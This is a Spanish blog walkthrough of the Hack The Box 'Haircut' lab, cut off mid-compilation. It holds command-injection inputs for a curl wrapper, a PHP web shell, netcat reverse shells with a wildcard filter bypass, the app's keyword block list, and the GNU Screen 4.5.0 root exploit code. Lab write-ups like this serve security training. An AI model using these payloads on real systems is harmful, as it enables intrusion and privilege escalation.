<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>            Hack The Box Haircut - K4miyo      Ciberseguridad!      </title>
<meta name="description" content="Resolución de la máquina Haircut en la plataforma de Hack The Box">



<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="K4miyo | Ciberseguridad!">
<meta property="og:title" content="Hack The Box Haircut">
<meta property="og:url" content="http://localhost:4000/htb-haircut/">


  <meta property="og:description" content="Resolución de la máquina Haircut en la plataforma de Hack The Box">



  <meta property="og:image" content="http://localhost:4000/assets/images/htb-haircut/haircut.jpg">





  <meta property="article:published_time" content="2021-10-18T00:00:00-05:00">





  

  


<link rel="canonical" href="http://localhost:4000/htb-haircut/">







  <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Person",
      "name": "K4miyo",
      "url": "http://localhost:4000",
      "sameAs": null
    }
  </script>







<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="K4miyo | Ciberseguridad! Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE ]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
                
        <ul class="visible-links">
<li class="masthead__menu-item">
              <a href="/">Home</a>
            </li>
<li class="masthead__menu-item">
              <a href="/year-archive/">Artículos</a>
            </li>
<li class="masthead__menu-item">
              <a href="/categories/">Categorías</a>
            </li>
<li class="masthead__menu-item">
              <a href="/tags/">Etiquetas</a>
            </li>
<li class="masthead__menu-item">
              <a href="/buscador/">Buscador</a>
            </li>
<li class="masthead__menu-item">
              <a href="/about/">Contacto</a>
            </li>
</ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>
    

    <div class="initial-content">
      


  
    



<nav class="breadcrumbs">
  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
    
    
    
      
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
          <meta itemprop="position" content="1">
        </li>
        <span class="sep">/</span>
      
      
        <li class="current">Hack The Box Haircut</li>
      
    
  </ol>
</nav>

  


<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      

      
        <img src="/assets/images/avatar.png" alt="K4miyo" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">K4miyo</h3>
    
    
      <p class="author__bio" itemprop="description">
        Cyber Threat Intelligence Analyst
      </p>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      

      

      

      

      

      

      

      

      

      

      

      

      

      
        <li>
          <a href="https://github.com/k4miyo" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
          </a>
        </li>
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>


  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Hack The Box Haircut">
    <meta itemprop="description" content="Resolución de la máquina Haircut en la plataforma de Hack The Box">
    <meta itemprop="datePublished" content="October 18, 2021">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">Hack The Box Haircut
</h1>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
        <p class="page__meta">
          
            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2021-10-18T00:00:00-05:00">October 18, 2021 </time> 
          
          
        </p>
        <p><img src="/assets/images/htb-haircut/banner-haircut.jpg" alt=""></p>

<h2 id="haircut">Haircut</h2>
<p>Se procede con la fase de reconocimiento lanzando primeramente un <code class="language-plaintext highlighter-rouge">ping</code> a la dirección IP 10.10.10.24.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 10.10.10.24
PING 10.10.10.24 <span class="o">(</span>10.10.10.24<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
64 bytes from 10.10.10.24: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>63 <span class="nb">time</span><span class="o">=</span>141 ms

<span class="nt">---</span> 10.10.10.24 ping statistics <span class="nt">---</span>
1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
rtt min/avg/max/mdev <span class="o">=</span> 140.830/140.830/140.830/0.000 ms
</code></pre></div></div>

<p>De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de <code class="language-plaintext highlighter-rouge">nmap</code> para determinar los puertos abiertos de la máquina y exportanto la información al archivo <strong>allPorts</strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-T5</span> <span class="nt">-v</span> <span class="nt">-n</span> 10.10.10.24 <span class="nt">-oG</span> allPorts
Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-10-18 14:23 CDT
Initiating Ping Scan at 14:23
Scanning 10.10.10.24 <span class="o">[</span>4 ports]
Completed Ping Scan at 14:23, 0.16s elapsed <span class="o">(</span>1 total hosts<span class="o">)</span>
Initiating SYN Stealth Scan at 14:23
Scanning 10.10.10.24 <span class="o">[</span>65535 ports]
Discovered open port 22/tcp on 10.10.10.24
Discovered open port 80/tcp on 10.10.10.24
SYN Stealth Scan Timing: About 46.88% <span class="k">done</span><span class="p">;</span> ETC: 14:24 <span class="o">(</span>0:00:35 remaining<span class="o">)</span>
Completed SYN Stealth Scan at 14:24, 60.57s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
Nmap scan report <span class="k">for </span>10.10.10.24
Host is up <span class="o">(</span>0.19s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65533 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>60.85 seconds
           Raw packets sent: 68006 <span class="o">(</span>2.992MB<span class="o">)</span> | Rcvd: 68003 <span class="o">(</span>2.720MB<span class="o">)</span>
</code></pre></div></div>

<p>Mediante la función <a href="/extractPorts">extractPorts</a> definida a nivel de <code class="language-plaintext highlighter-rouge">zsh</code> , se obtiene la información más relevante de la captura grepeable.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ extractPorts allPorts
───────┬───────────────────────────────────────
       │ File: extractPorts.tmp
───────┼───────────────────────────────────────
   1   │ 
   2   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Extracting information...
   3   │ 
   4   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> IP Address: 10.10.10.24
   5   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> Open ports: 22,80
   6   │ 
   7   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Ports copied to clipboard
</code></pre></div></div>

<p>A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p22</span>,80 10.10.10.24 <span class="nt">-oN</span> targeted
Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-10-18 14:25 CDT
Nmap scan report <span class="k">for </span>10.10.10.24
Host is up <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 e9:75:c1:e4:b3:63:3c:93:f2:c6:18:08:36:48:ce:36 <span class="o">(</span>RSA<span class="o">)</span>
|   256 87:00:ab:a9:8f:6f:4b:ba:fb:c6:7a:55:a8:60:b2:68 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 b6:1b:5c:a9:26:5c:dc:61:b7:75:90:6c:88:51:6e:54 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    nginx 1.10.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title:  HTB Hairdresser 
|_http-server-header: nginx/1.10.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>11.71 seconds
</code></pre></div></div>

<p>Vemos el puerto 80 abierto asociado al servicio al servicio HTTP, así que vamos a ver a lo que nos enfrentamos con <code class="language-plaintext highlighter-rouge">whatweb</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ whatweb http://10.10.10.24/
http://10.10.10.24/ <span class="o">[</span>200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.10.0 <span class="o">(</span>Ubuntu<span class="o">)]</span>, IP[10.10.10.24], Title[HTB Hairdresser], nginx[1.10.0]
</code></pre></div></div>

<p>Vamos a echarle un ojo al sitio web:</p>

<p><img src="/assets/images/htb-haircut/haircut-web.png" alt=""></p>

<p>No vemos nada internesante, así que vamos a tratar de descubrir rutas dentro del servidor web:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wfuzz <span class="nt">-c</span> <span class="nt">-t</span> 100 <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">--hw</span><span class="o">=</span>15 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.24/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="s1">'s documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.24/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                         
=====================================================================

000000164:   301        7 L      13 W       194 Ch      "uploads"                                                       
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 12.50386
Processed Requests: 1500
Filtered Requests: 1499
Requests/sec.: 119.9629
</span></code></pre></div></div>

<p>Tenemos el recurso <code class="language-plaintext highlighter-rouge">uploads</code>, pero si tratamos de ingresar, nos aparece un código de estado 403; por lo que vamos a tratar de encontrar recursos mediante un archivo de extensiones:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>txt
php
jpg
html
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wfuzz <span class="nt">-c</span> <span class="nt">-t</span> 250 <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">--hw</span><span class="o">=</span>15 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-w</span> extensiones.txt http://10.10.10.24/FUZZ.FUZ2Z
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="s1">'s documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.24/FUZZ.FUZ2Z
Total requests: 882240

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                         
=====================================================================

000024515:   200        458 L    5055 W     127758 Ch   "sea - jpg"                                                     
000057567:   200        285 L    2435 W     109923 Ch   "bounce - jpg"                                                  
000100226:   200        19 L     41 W       446 Ch      "exposed - php"                                                 
000250875:   200        645 L    5909 W     159506 Ch   "carrie - jpg"                                                  
^C000364418:   404        7 L      13 W       178 Ch      "20061223am1 - php"                                             

Total time: 0
Processed Requests: 364391
Filtered Requests: 364387
Requests/sec.: 0
</span></code></pre></div></div>

<p>Vemos los siguientes recursos:</p>

<ul>
  <li>sea.jpg</li>
  <li>bounce.jpg</li>
  <li>exposed.php</li>
  <li>carrie.jpg</li>
</ul>

<p>Le echamos un ojo primero al recurso <code class="language-plaintext highlighter-rouge">exposed.php</code>:</p>

<p><img src="/assets/images/htb-haircut/haircut-exposed.png" alt=""></p>

<p>Si le damos al botón <strong>Go</strong>, nos arroja lo siguiente:</p>

<p><img src="/assets/images/htb-haircut/haircut-exposed1.png" alt=""></p>

<p>Observamos los siguientes datos que nos pueden parecer un poco</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>% Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 0 0 0 0 0 0 0 0 <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:-- 0 100 223 100 223 0 0 34440 0 <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:-- 37166
</code></pre></div></div>

<p>Se trata del uso de la función <code class="language-plaintext highlighter-rouge">curl</code>, por lo que es posible que el sitio realice un <code class="language-plaintext highlighter-rouge">curl</code> hacia un recurso interno de la máquina víctima <code class="language-plaintext highlighter-rouge">http://localhost/test.html</code>. Así que vamos a probar si tenemos ejecución de comando a nivel de sistema de múltiples formas:</p>

<ul>
  <li>http://localhost/test.html; whoami</li>
  <li>http://localhost/test.html &amp;&amp; whoami</li>
  <li>http://localhost/loquesea.html || whoami</li>
</ul>

<p>Al probarlos, el sitio nos arroja a siguiente leyenda: <strong><em>is not a good thing to put in a URL</em></strong>. Así que vamos a tratar de utilizar parámetros de la función <code class="language-plaintext highlighter-rouge">curl</code>, en especifico <code class="language-plaintext highlighter-rouge">-o</code> para que nos cree un archivo en la ruta <code class="language-plaintext highlighter-rouge">uploads</code> y considerando que el servidor web se encuentra alojado en la ruta default <code class="language-plaintext highlighter-rouge">/var/www/html</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://localhost/test.html <span class="nt">-o</span> /var/www/html/uploads/test.html
</code></pre></div></div>

<p><img src="/assets/images/htb-haircut/haircut-curl.png" alt=""></p>

<p>Se nos creó el archivo <code class="language-plaintext highlighter-rouge">test.html</code> en el recurso <code class="language-plaintext highlighter-rouge">uploads</code>; así que tenemos creación de archivo dentro de dicho directorio. Vamos a probar si tenemos posibilidad de visualizar recursos externos, así que nos creamos un archivo de prueba <code class="language-plaintext highlighter-rouge">test.txt</code>:</p>

<pre><code class="language-txt">Esto es una prueba
</code></pre>

<p>Y vamos a tratar de visualizarlo desde la página web, por lo que debemos compartir un recurso HTTP con python:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
10.10.10.24 - - <span class="o">[</span>18/Oct/2021 20:35:30] <span class="s2">"GET /test.txt HTTP/1.1"</span> 200 -
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.10.14.16/test.txt
</code></pre></div></div>

<p><img src="/assets/images/htb-haircut/haircut-curl1.png" alt=""></p>

<p>Nos arroja la información de nuestro archivo, por lo que vamos a probar si podemos guardar dicho archivo en el recurso <code class="language-plaintext highlighter-rouge">uploads</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.10.14.16/test.txt <span class="nt">-o</span> /var/www/html/uploads/test.txt
</code></pre></div></div>

<p><img src="/assets/images/htb-haircut/haircut-curl2.png" alt=""></p>

<p>Podemos subir archivos al sistema, así que vamos a crear nuestro archivo <code class="language-plaintext highlighter-rouge">shell.php</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php
        <span class="nb">echo</span> <span class="s2">"&lt;pre&gt;"</span> <span class="nb">.</span> shell_exec<span class="o">(</span><span class="nv">$_REQUEST</span><span class="o">[</span><span class="s1">'cmd'</span><span class="o">])</span> <span class="nb">.</span> <span class="s2">"&lt;/pre&gt;"</span><span class="p">;</span>
?&gt;
</code></pre></div></div>

<p>Lo subimos al servidor:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
10.10.10.24 - - <span class="o">[</span>18/Oct/2021 20:56:59] <span class="s2">"GET /shell.php HTTP/1.1"</span> 200 -
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.10.14.16/shell.php <span class="nt">-o</span> /var/www/html/uploads/shell.php
</code></pre></div></div>

<p><img src="/assets/images/htb-haircut/haircut-shell.png" alt=""></p>

<p>Ya tenemos ejecución de comandos a nivel de sistema; asi que vamos a tratar de entablarnos una reverse shell con <code class="language-plaintext highlighter-rouge">nc</code> y nos ponemos en escucha por el puerto 443:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.10.10.24/uploads/shell.php?cmd<span class="o">=</span>nc <span class="nt">-e</span> /bin/bash 10.10.14.16 443 &amp;
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.16] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.24] 49758
<span class="nb">whoami
</span>www-data
</code></pre></div></div>

<p>Nos encontramos dentro de la máquina víctima, pero antes de todo, vamos a realizar un <a href="/tratamiento-tty">Tratamiento de la tty</a> para trabajar más cómodos.</p>

<p>Ahora, si revisamos el archivo <code class="language-plaintext highlighter-rouge">exposed.php</code> ubicado en la ruta <code class="language-plaintext highlighter-rouge">/var/www/html/</code>, vemos que no podemos utilizar los siguientes caracteres y palabras dentro del input:</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$disallowed</span><span class="o">=</span><span class="k">array</span><span class="p">(</span><span class="s1">'%'</span><span class="p">,</span><span class="s1">'!'</span><span class="p">,</span><span class="s1">'|'</span><span class="p">,</span><span class="s1">';'</span><span class="p">,</span><span class="s1">'python'</span><span class="p">,</span><span class="s1">'nc'</span><span class="p">,</span><span class="s1">'perl'</span><span class="p">,</span><span class="s1">'bash'</span><span class="p">,</span><span class="s1">'&amp;'</span><span class="p">,</span><span class="s1">'#'</span><span class="p">,</span><span class="s1">'{'</span><span class="p">,</span><span class="s1">'}'</span><span class="p">,</span><span class="s1">'['</span><span class="p">,</span><span class="s1">']'</span><span class="p">);</span>
</code></pre></div></div>

<p>A este punto, ya debemos estar pensando en otra forma de acceder a la máquina con la ejecución de comandos y sin necesidad de subir una reverse shell:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://<span class="si">$(</span>/bin/n? <span class="nt">-e</span> /bin/bas? 10.10.14.16 443<span class="si">)</span>
</code></pre></div></div>

<p>Si lo ejecutamos y nos ponemos en escucha por el puerto 443, se nos entabla una reverse shell y podemos visualizar la flag (user.txt). Ahora nos queda escalar privilegios, por lo que enumeramos un poco el sistema.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@haircut:/<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
www-data@haircut:/<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>www-data: 
www-data@haircut:/<span class="nv">$ </span><span class="nb">cd</span> /
www-data@haircut:/<span class="nv">$ </span>find <span class="se">\-</span>perm <span class="nt">-4000</span> 2&gt;/dev/null
./bin/ntfs-3g
./bin/ping6
./bin/fusermount
./bin/su
./bin/mount
./bin/ping
./bin/umount
./usr/bin/sudo
./usr/bin/pkexec
./usr/bin/newuidmap
./usr/bin/newgrp
./usr/bin/newgidmap
./usr/bin/gpasswd
./usr/bin/at
./usr/bin/passwd
./usr/bin/screen-4.5.0
./usr/bin/chsh
./usr/bin/chfn
./usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/snapd/snap-confine
./usr/lib/eject/dmcrypt-get-device
./usr/lib/openssh/ssh-keysign
./usr/lib/policykit-1/polkit-agent-helper-1
www-data@haircut:/<span class="err">$</span>
</code></pre></div></div>

<p>Tenemos el binario <code class="language-plaintext highlighter-rouge">screen-4.5.0</code>, así que vamos a buscar un posible exploit público asociado:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ searchsploit screen 4.5.0
<span class="nt">-----------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
 Exploit Title                                                                                 |  Path
<span class="nt">-----------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
GNU Screen 4.5.0 - Local Privilege Escalation                                                  | linux/local/41154.sh
GNU Screen 4.5.0 - Local Privilege Escalation <span class="o">(</span>PoC<span class="o">)</span>                                            | linux/local/41152.txt
<span class="nt">-----------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
Shellcodes: No Results
</code></pre></div></div>

<p>Vemos dos recursos, un script en bash y otro una prueba de concepto (PoC). Para este caso utilizaremos el script; sin embargo, no vamos a ejecutarlo en la máquina víctima, vamos a ver que hace primeramente:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ searchsploit <span class="nt">-m</span> linux/local/41154.sh
  Exploit: GNU Screen 4.5.0 - Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/41154
     Path: /usr/share/exploitdb/exploits/linux/local/41154.sh
File Type: Bourne-Again shell script, ASCII text executable, with CRLF line terminators

Copied to: /home/k4miyo/Documentos/HTB/Haircut/exploits/41154.sh


❯ <span class="nb">mv </span>41154.sh screen_privesc.sh
❯ catn screen_privesc.sh
<span class="c">#!/bin/bash</span>
<span class="c"># screenroot.sh</span>
<span class="c"># setuid screen v4.5.0 local root exploit</span>
<span class="c"># abuses ld.so.preload overwriting to get root.</span>
<span class="c"># bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html</span>
<span class="c"># HACK THE PLANET</span>
<span class="c"># ~ infodox (25/1/2017) </span>
<span class="nb">echo</span> <span class="s2">"~ gnu/screenroot ~"</span>
<span class="nb">echo</span> <span class="s2">"[+] First, we create our shell and library..."</span>
<span class="nb">cat</span> <span class="o">&lt;&lt;</span> <span class="no">EOF</span><span class="sh"> &gt; /tmp/libhax.c
#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;unistd.h&gt;
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!</span><span class="se">\n</span><span class="sh">");
}
</span><span class="no">EOF
</span>gcc <span class="nt">-fPIC</span> <span class="nt">-shared</span> <span class="nt">-ldl</span> <span class="nt">-o</span> /tmp/libhax.so /tmp/libhax.c
<span class="nb">rm</span> <span class="nt">-f</span> /tmp/libhax.c
<span class="nb">cat</span> <span class="o">&lt;&lt;</span> <span class="no">EOF</span><span class="sh"> &gt; /tmp/rootshell.c
#include &lt;stdio.h&gt;
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
</span><span class="no">EOF
</span>gcc <span class="nt">-o</span> /tmp/rootshell /tmp/rootshell.c
<span class="nb">rm</span> <span class="nt">-f</span> /tmp/rootshell.c
<span class="nb">echo</span> <span class="s2">"[+] Now we create our /etc/ld.so.preload file..."</span>
<span class="nb">cd</span> /etc
<span class="nb">umask </span>000 <span class="c"># because</span>
screen <span class="nt">-D</span> <span class="nt">-m</span> <span class="nt">-L</span> ld.so.preload <span class="nb">echo</span> <span class="nt">-ne</span>  <span class="s2">"</span><span class="se">\x</span><span class="s2">0a/tmp/libhax.so"</span> <span class="c"># newline needed</span>
<span class="nb">echo</span> <span class="s2">"[+] Triggering..."</span>
screen <span class="nt">-ls</span> <span class="c"># screen itself is setuid, so... </span>
/tmp/rootshell# 
</code></pre></div></div>

<p>Analizando un poco el script, primero crea un archivo llamado <code class="language-plaintext highlighter-rouge">libhax.c</code> y lo compila como <code class="language-plaintext highlighter-rouge">libhax.so</code>; asi que vamos a realizar esta parte, creando dicho archivo y compilandolo.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;unistd.h&gt;
</span><span class="n">__attribute__</span> <span class="p">((</span><span class="n">__constructor__</span><span class="p">))</span>
<span class="kt">void</span> <span class="nf">dropshell</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
    <span class="n">chown</span><span class="p">(</span><span class="s">"/tmp/rootshell"</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">chmod</span><span class="p">(</span><span class="s">"/tmp/rootshell"</span><span class="p">,</span> <span class="mo">04755</span><span class="p">);</span>
    <span class="n">unlink</span><span class="p">(</span><span class="s">"/etc/ld.so.preload"</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] done!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ gcc <span class="nt">-fPIC</span> <span class="nt">-shared</span> <span class="nt">-ldl</span> <span class="nt">-o</span> libhax.so libhax.c

libhax.c: In <span class="k">function</span> ‘dropshell’:
libhax.c:7:5: warning: implicit declaration of <span class="k">function</span> ‘chmod’ <span class="o">[</span><span class="nt">-Wimplicit-function-declaration</span><span class="o">]</span>
    7 |     <span class="nb">chmod</span><span class="o">(</span><span class="s2">"/tmp/rootshell"</span>, 04755<span class="o">)</span><span class="p">;</span>
      |     ^~~~~
</code></pre></div></div>

<p>Nos aparece un <strong>Warning</strong>, pero no hay problema. Ahora borramos el archivo <code class="language-plaintext highlighter-rouge">libhax.c</code>, creamos el archivo <code class="language-plaintext highlighter-rouge">rootshell.c</code> y lo compilamos:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
</span><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
    <span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="n">seteuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="n">setegid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="n">execvp</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">rm </span>libhax.c
❯ gcc <span class="nt">-o</span> rootshell rootshell.c
rootshell.c: In <span class="k">function</span> ‘main’:
